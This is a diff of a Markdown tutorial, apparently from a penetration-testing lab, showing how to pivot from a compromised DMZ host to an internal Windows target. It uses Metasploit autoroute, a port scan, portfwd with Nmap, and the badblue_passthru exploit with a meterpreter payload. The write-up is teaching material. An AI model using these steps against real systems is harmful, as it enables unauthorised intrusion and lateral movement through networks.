@@ -5,28 +5,35 @@ Pivoting is a technique in cyber security that allows an attacker to move from o
 
 ## Example of Pivoting <br>
 We are in the DMZ, after obtain the initial access on a Target, we will use it to perform pivoting on the internal network.
-Victim Machine 1 : 10.3.19.187 (first Target in the DMZ, where we are)
-Victim Machine 2 : 10.3.17.176 (second Target in the internal network target reachable with Pivoting) <br>
+Victim Machine 1 : 10.3.25.174 (first Target in the DMZ, where we are)
+Victim Machine 2 : 10.3.24.33 (second Target in the internal network target reachable with Pivoting) <br>
 
 Exploit the first Machine and got an initial access.
 <img src="exploit1.png" width=70% height="auto"><br><br>
 ipconfig:
 <img src="ipconfig.png" width=70% height="auto"><br><br>
-Execute the command: run autoroute -s 10.3.17.0/20
+Execute the command: run autoroute -s 10.3.25.0/20
 <img src="autoroute.png" width=70% height="auto"><br><br>
 Use Metasploit post exploitation module for scanning the Target 2: 
 use auxiliary/scanner/portscan/tcp
-set RHOSTS 10.3.19.187
+set RHOSTS 10.3.24.33  (ip target 2)
 set PORTS 1-100
 exploit 
 <img src="scanningtarget2.png" width=70% height="auto"><br><br>
 Now, we will forward the remote port 80 to local port 1234 and grab the banner using Nmap
-portfwd add -l 1234 -p 80 -r 10.3.19.187
+portfwd add -l 1234 -p 80 -r 10.3.24.33 (ip target 2)
 <img src="fwd.png" width=70% height="auto"><br><br>
+
 nmap -sV -sS -p 1234 localhost (don't close Meta, use another terminal)
-<img src="pwdnmap.png" width=70% height="auto"><br><br>
+<img src="fwdnmap.png" width=70% height="auto"><br><br>
 Successfull! We scanned the internal network Target!! Now we will exploit it with Metasploit.
 use exploit/windows/http/badblue_passthru
 set PAYLOAD windows/meterpreter/bind_tcp
-set RHOSTS 10.3.19.187
+set RHOSTS 10.3.24.33 (ip target 2)
 exploit
+<img src="exploit2.png" width=70% height="auto"><br><br>
+Check that we are in the Target 2 with sysinfo and ipconfig
+<img src="check1.png" width=70% height="auto"><img src="check2.png" width=70% height="auto"><br><br>
+
+#Author
+<b>Xiao Li Savio Feng</b>
